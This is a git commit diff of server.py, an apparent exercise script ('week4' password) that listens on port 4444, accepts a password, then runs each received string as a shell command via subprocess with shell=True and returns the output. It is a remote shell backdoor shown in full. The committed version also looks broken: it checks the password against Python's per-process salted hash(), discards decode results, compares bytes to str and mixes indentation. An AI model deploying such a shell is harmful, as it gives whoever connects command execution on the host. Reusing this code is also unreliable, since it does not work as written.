ed8c667df6bbee6bee9fdadbef2e10a8688612b3
Hussnain <hussnainkhan786786@gmail.com>
2025-04-24 04:22:31 +0500

    test18

--- server.py
+++ server.py
@@ -8,67 +8,69 @@ PORT = 4444
 server = socket.socket()
 server.bind((HOST, PORT))
 
+
 def login():    
-    print('[+] Server Started')
-    print('[+] Listening for Client Connection...')
+    print('Server Started')
+    print('Listening for Client Connection...')
     server.settimeout(120)
     server.listen(1)
-
+    
     global client, client_addr
     client, client_addr = server.accept()
-    print('[+] Connection established, login attempt')
-    
+    print('Connection established, login attempt')
     while True:
-        try:
-            password = client.recv(1024).decode().strip()
-            print(f'[*] Password received: {password}')
-            
-            if not password:
-                print('[!] No password received. Closing connection.')
-                client.close()
-                return False
-            
-            if password == "week4":
-                print('[+] Login Success')
-                return True
-            else:
-                print('[-] Failed Login')
-                client.close()
-                return False
+            try:                
+                password = client.recv(1024)
                 
-        except SocketError as se:
-            print('[!] SocketError:', se)
-            server.listen(1)
-            client, client_addr = server.accept()
-        except Exception as e:
-            print('[!] Exception:', e)
+                if (len(password) == 0):
+                    print('Failed Login')
+                    client.close()
+                    return False
+                
+                password.decode()
+                print(password)
+                if hash(password) == 1634504265594755506:
+                        print('Login Success')
+                        return True
+                else:
+                    print('Failed Login')
+                    client.close()
+                    return False
+            except SocketError as se:
+                print('SocketError', se)                
+                server.listen(1)
+                client, client_addr = server.accept()
+            except Exception as e:
+                print('Exception', e)
 
 login_status = False
 while not login_status:
     login_status = login()
 
 while True:
-    try:
-        print('[*] Awaiting Command...')
-        command = client.recv(1024).decode().strip()
+    	try:
+            print('Awaiting Command')
+            command = client.recv(1024)
+            command.decode()
 
-        if command == 'exit':
-            continue
+            if command == 'exit':
+                    continue
 
-        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        stdout, stderr = process.communicate()
-        
-        response = stdout + stderr
+            op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
+            output = op.stdout.read()
+            output_error = op.stderr.read()
+            print('Sending Response')
 
-        if not response:
-            client.send(b'no stdout')
-        else:
-            client.send(response)
-    except Exception as e:
-        print('[!] Main Loop Exception:', e)
-        login_status = False
-        while not login_status:
-            login_status = login()
+            #print(output + output_error)
+            if output + output_error == '':
+                    client.send('no stdout')
+            else:
+                    client.send(output + output_error)
+    	except Exception as e:
+                print('Main Loop Exception', e)
+                login_status = False
+                while not login_status:
+                    login_status = login()
 
 server.close()
-print('[x] Connection Closed')
+print('Connection Closed')
